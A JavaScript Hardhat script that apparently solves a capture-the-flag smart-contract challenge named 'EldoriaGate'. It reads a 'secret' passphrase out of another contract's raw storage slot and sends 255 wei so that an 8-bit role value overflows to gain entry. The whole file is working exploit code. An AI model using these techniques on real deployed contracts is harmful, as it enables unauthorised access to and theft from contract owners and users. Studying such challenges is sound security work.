const { ethers } = require("hardhat");

async function main() {
  // Address to change with the one of the contract
  const targetAddress = "0xc69c5DFc2D7cb63785B3EF09Cb7b1eA631475074";
  
  const EldoriaGateABI = [
    "function kernel() external view returns (address)",
    "function enter(bytes4 passphrase) external payable"
  ];
  
  const target = new ethers.Contract(targetAddress, EldoriaGateABI, ethers.provider.getSigner());
  
  // 1. Get the kernel address
  const kernelAddress = await target.kernel();
  console.log("Kernel address:", kernelAddress);
  
  // 2. Read the storage slot 0 of the kernel contract
  const storageValue = await ethers.provider.getStorageAt(kernelAddress, 0);
  console.log("Raw storage slot 0:", storageValue);
  
  // 3. Extract the secret (passphrase) from the storage value (4 bytes at offset 28)
  const secret = ethers.utils.hexDataSlice(storageValue, 28, 32);
  console.log("Extracted secret (passphrase):", secret);
  
  // 4. Call the enter function with the secret and a contribution of 255
  //    This forces the contribution (_contribution) to 255, and in evaluateIdentity:
  //    roles = ROLE_SERF (1) + 255 = 256, of which the 8 least significant bits are 0.
  const tx = await target.enter(secret, { value: 255 });
  console.log("Transaction sent:", tx.hash);
  await tx.wait();
  console.log("Transaction confirmed.");
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error("Error:", error);
    process.exit(1);
  });
